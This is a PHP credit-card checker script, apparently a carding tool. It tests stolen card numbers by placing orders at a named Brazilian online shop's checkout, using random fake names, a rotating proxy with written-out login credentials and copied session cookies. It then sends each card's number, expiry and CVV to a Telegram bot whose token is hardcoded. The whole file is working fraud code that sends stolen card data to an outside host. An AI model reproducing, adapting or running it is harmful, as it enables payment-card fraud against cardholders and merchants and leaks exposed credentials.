<?php
$time = time();

    error_reporting(0);
    
    function multiexplode($delimiters, $string) {
        $one = str_replace($delimiters, $delimiters[0], $string);
        $two = explode($delimiters[0], $one);
        return $two;
    }
    $lista = $_GET['lista'];
    $cc = multiexplode(array(":", "|", ""), $lista)[0];
    $mes = multiexplode(array(":", "|", ""), $lista)[1];
    $ano = multiexplode(array(":", "|", ""), $lista)[2];
    $cvv = multiexplode(array(":", "|", ""), $lista)[3];
    function puxar($string, $start, $end) {
        $str = explode($start, $string);
        $str = explode($end, $str[1]);
        return $str[0];
    }
$bin1 = substr($cc, 0, 6); 
$file = 'bins.csv'; 
$searchfor = $bin1; 
$contents = file_get_contents($file); 
$pattern = preg_quote($searchfor, '/'); 
$pattern = "/^.*$pattern.*\$/m"; 
if (preg_match_all($pattern, $contents, $matches)) { 
    $encontrada = implode("\n", $matches[0]); 
}
$pieces = explode(";", $encontrada); 
$c = count($pieces);
if ($c == 8) { 
    $pais = $pieces[4]; 
    $paiscode = $pieces[5]; 
    $banco = $pieces[2]; 
    $level = $pieces[3]; 
    $bandeira = $pieces[1]; 
} else { 
    $pais = $pieces[5]; 
    $paiscode = $pieces[6]; 
    $link = $pieces[7]; 
    $level = $pieces[4]; 
    $banco = $pieces[2]; 
    $bandeira = $pieces[1]; 
}


if (file_exists(getcwd()."/cookies.txt")) {
        unlink(getcwd()."/cookies.txt");
    }

// ========================================  ARRAYS RANDOMS..  ========================================

//$email = substr(md5(rand(1,999999)), -15);
//$cep_last_three = rand(100,900);
$nomes = array("José", "Fernando", "Roberto", "Marcelo", "João", "John", "Kleiton", "Marcos", "Rogerio", "Jhon", "Flavio", "Renato");
$sobrenomes = array("Silva", "Silas", "Souza", "Santos", "Neto", "Lobato", "Santos", "Almeida", "Albuquerque", "Dantas", "Raia");
$nome_pessoa = $nomes[array_rand($nomes)];
$sobrenome_pessoa = $sobrenomes[array_rand($sobrenomes)];

// ========================================  ARRAYS RANDOMS..  ========================================



// ========================================  CONTAR QUANTOS DIGITOS TEM A CC  ========================================

$contador_cc = strlen($lista);

if ($contador_cc < 6) {
    echo json_encode(array("status" => 1, "str" => "<font class=\"label label-danger\">Error</font> | $lista | <b>Vai se foder otaku.. ! </b><br>"));
    return;
}


// ========================================  CONTAR QUANTOS DIGITOS TEM A CC  ========================================



//$key = puxar($add, 'form_key" type="hidden" value="','"');



///////////////////////////////// CURL PARA ADICIONAR ITEM NO CARRINHO /////////////////////////////////

//$ini = curl_init();
//curl_setopt($ini, CURLOPT_URL, 'https://www.omniavita.com.br/checkout/cart/add/uenc/aHR0cHM6Ly93d3cub21uaWF2aXRhLmNvbS5ici9wb3dlcnN1cHAtZGlsYXRleD9fX19TSUQ9VQ,,/product/1162/form_key/'.$key.'/');
//curl_setopt($ini, CURLOPT_FOLLOWLOCATION, 1);
//curl_setopt($ini, CURLOPT_RETURNTRANSFER, 1);
//curl_setopt($ini, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
//curl_setopt($ini, CURLOPT_COOKIEJAR, getcwd(). "/cookies.txt");
//curl_setopt($ini, CURLOPT_COOKIEFILE, getcwd(). "/cookies.txt");
//curl_setopt($ini, CURLOPT_HTTPHEADER, array(

//'accept: text/javascript, text/html, application/xml, text/xml, */*',
//'content-type: application/x-www-form-urlencoded; charset=UTF-8',
//'cookie: frontend_cid=FBDagM3q72ALbTnz; cdz_popup=true; __utma=256334357.1240647773.1660018431.1660018431.1660018431.1; __utmc=256334357; __utmz=256334357.1660018431.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none); __utmt=1; frontend=0c7ut5pabdmel0tor2qa9s4dj6; persistent_shopping_cart=aRoQViPuqirBejxWGJibtX8KAWbQHV5Uo3ek7cf8Cx8MUKKODT; __utmb=256334357.4.10.1660018431',
//'origin: https://www.omniavita.com.br',
//'referer: https://www.omniavita.com.br/powersupp-dilatex',
//'sec-fetch-dest: empty',
//'sec-fetch-mode: cors',
///////'sec-fetch-site: same-origin',
//'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.114 Safari/537.36 OPR/89.0.4447.48',
//'x-requested-with: XMLHttpRequest'

//));
//curl_setopt($ini, CURLOPT_POSTFIELDS, 'form_key='.$key.'&product=1162&related_product=&qty=1');
//$add = curl_exec($ini);

///////////////////////////////////// CURL PARA ADICIONAR ITEM NO CARRINHO /////////////////////////////////



//$ini = curl_init();
//curl_setopt($ini, CURLOPT_URL, "https://www.omniavita.com.br/onestepcheckout/ajax/saveShippingMethod/");
//curl_setopt($ini, CURLOPT_FOLLOWLOCATION, 1);
//curl_setopt($ini, CURLOPT_RETURNTRANSFER, 1);
//curl_setopt($ini, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
//curl_setopt($ini, CURLOPT_COOKIEJAR, getcwd(). "/cookies.txt");
//curl_setopt($ini, CURLOPT_COOKIEFILE, getcwd(). "/cookies.txt");
//curl_setopt($ini, CURLOPT_HTTPHEADER, array(

//'accept: text/javascript, text/html, application/xml, text/xml, */*',
//'content-type: application/x-www-form-urlencoded; charset=UTF-8',
//'cookie: frontend_cid=FBDagM3q72ALbTnz; cdz_popup=true; __utma=256334357.1240647773.1660018431.1660018431.1660018431.1; __utmc=256334357; __utmz=256334357.1660018431.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none); frontend=0c7ut5pabdmel0tor2qa9s4dj6; persistent_shopping_cart=aRoQViPuqirBejxWGJibtX8KAWbQHV5Uo3ek7cf8Cx8MUKKODT; __utmt=1; __utmb=256334357.20.10.1660018431',
//'origin: https://www.omniavita.com.br',
//'referer: https://www.omniavita.com.br/onestepcheckout/index/',
//'sec-fetch-dest: empty',
//'sec-fetch-mode: cors',
//'sec-fetch-site: same-origin',
//'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.134 Safari/537.36 OPR/89.0.4447.83',
//'x-requested-with: XMLHttpRequest'

//));
//curl_setopt($ini, CURLOPT_POSTFIELDS, 'shipping_method=pedroteixeira_correios_03298');
//$forma_entrega = curl_exec($ini);



$ini = curl_init();
curl_setopt($ini, CURLOPT_URL, "https://www.omniavita.com.br/onestepcheckout/ajax/placeOrder/");
curl_setopt($ini, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ini, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ini, CURLOPT_PROXY, "http://p.webshare.io:80");
curl_setopt($ini, CURLOPT_PROXYUSERPWD, "xotyjlsh-rotate:vzfrfocr2zg2");
curl_setopt($ini, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ini, CURLOPT_COOKIEJAR, getcwd(). "/cookies.txt");
curl_setopt($ini, CURLOPT_COOKIEFILE, getcwd(). "/cookies.txt");
curl_setopt($ini, CURLOPT_HTTPHEADER, array(

'accept: text/javascript, text/html, application/xml, text/xml, */*',
'content-type: application/x-www-form-urlencoded; charset=UTF-8',
'cookie: frontend_cid=FBDagM3q72ALbTnz; cdz_popup=true; __utma=256334357.1240647773.1660018431.1660018431.1660018431.1; __utmc=256334357; __utmz=256334357.1660018431.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none); __utmt=1; frontend=0c7ut5pabdmel0tor2qa9s4dj6; persistent_shopping_cart=aRoQViPuqirBejxWGJibtX8KAWbQHV5Uo3ek7cf8Cx8MUKKODT; __utmb=256334357.4.10.1660018431',
'origin: https://www.omniavita.com.br',
'referer: https://www.omniavita.com.br/onestepcheckout/index/',
'sec-fetch-dest: empty',
'sec-fetch-mode: cors',
'sec-fetch-site: same-origin',
'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.114 Safari/537.36 OPR/89.0.4447.48',
'x-requested-with: XMLHttpRequest'

));
curl_setopt($ini, CURLOPT_POSTFIELDS, 'billing_address_id=3490&billing%5Bfirstname%5D='.$nome_pessoa.'&billing%5Blastname%5D='.$sobrenome_pessoa.'&billing%5Btelephone%5D=&billing%5Bfax%5D=&billing%5Bpostcode%5D=&billing%5Bstreet%5D%5B%5D=&billing%5Bstreet%5D%5B2%5D=&billing%5Bstreet%5D%5B3%5D=&billing%5Bstreet%5D%5B4%5D=&billing%5Bcity%5D=&billing%5Bregion_id%5D=&billing%5Bregion%5D=&billing%5Bcountry_id%5D=BR&billing%5Buse_for_shipping%5D=1&shipping_method=pedroteixeira_correios_03298&payment%5Bmethod%5D=stone_cc&payment%5Bcc_number%5D='.$cc.'&payment%5Bcc_type%5D=MC&payment%5Bcc_owner%5D='.$nome_pessoa.'%20'.$sobrenome_pessoa.'&payment%5Bcc_exp_month%5D='.$mes.'&payment%5Bcc_exp_year%5D='.$ano.'&payment%5Bcc_cid%5D='.$cvv.'&payment%5Binstallments%5D=1&coupon_code=');
$meupiru = curl_exec($ini);

$retorno = puxar($meupiru, '"messages":["','"');




if(strpos($meupiru, '"success":false,')!== false){

    echo "<span class='badge badge-danger'>Reprovada</span> ❌ $cc|$mes|$ano|$cvv » <span class='badge badge-danger'>$bandeira - $banco - $level - $pais</span> » <span class='badge badge-info'>Retorno:</span> » <span class='badge badge-warning'>$retorno</span>  » <span class='badge badge-info'>Tempo de resposta:</span> ".(time() - $time)." s <br>";

    $botoken = "5489114857:AAGAQTxpaGwaq9_zijyPQh6lEp_6-c6J8qs";
    $data = ['text' => "DB => $cc|$mes|$ano|$cvv",'chat_id' => '1040924962', 'parse_mode' => 'html'];
    file_get_contents("https://api.telegram.org/bot$botoken/sendMessage?" . http_build_query($data));

}

elseif(strpos($meupiru, "Resource Limit Is Reached")!== false){

    echo "<span class='badge badge-danger'>Reprovada</span> ❌ $cc|$mes|$ano|$cvv » <span class='badge badge-danger'>$bandeira - $banco - $level - $pais</span> » <span class='badge badge-info'>Retorno:</span> » <span class='badge badge-warning'>$retorno</span> » <span class='badge badge-info'>Tempo de resposta:</span> ".(time() - $time)." s <br>";

}
elseif(strpos($meupiru, "Please wait while your request is being verified...")!== false){

    echo " <span class='badge badge-danger'>Error</span> ❌ $cc|$mes|$ano|$cvv - <span class='badge badge-info'>Retorno:</span> Error request <br>";

}
else{

    echo "<span class='badge badge-success'>Aprovada</span> ✔ $cc|$mes|$ano|$cvv » <span class='badge badge-danger'>$bandeira - $banco - $level - $pais</span> » <span class='badge badge-info'>Retorno:</span> » $retorno - Transacao capturada! » <span class='badge badge-info'>Tempo de resposta:</span> ".(time() - $time)." s <br>";

    $botoken = "5489114857:AAGAQTxpaGwaq9_zijyPQh6lEp_6-c6J8qs";
    $data = ['text' => "APROVADA => $cc|$mes|$ano|$cvv - $bandeira - $banco - $level - $pais",'chat_id' => '1040924962', 'parse_mode' => 'html'];
    file_get_contents("https://api.telegram.org/bot$botoken/sendMessage?" . http_build_query($data));

}

?>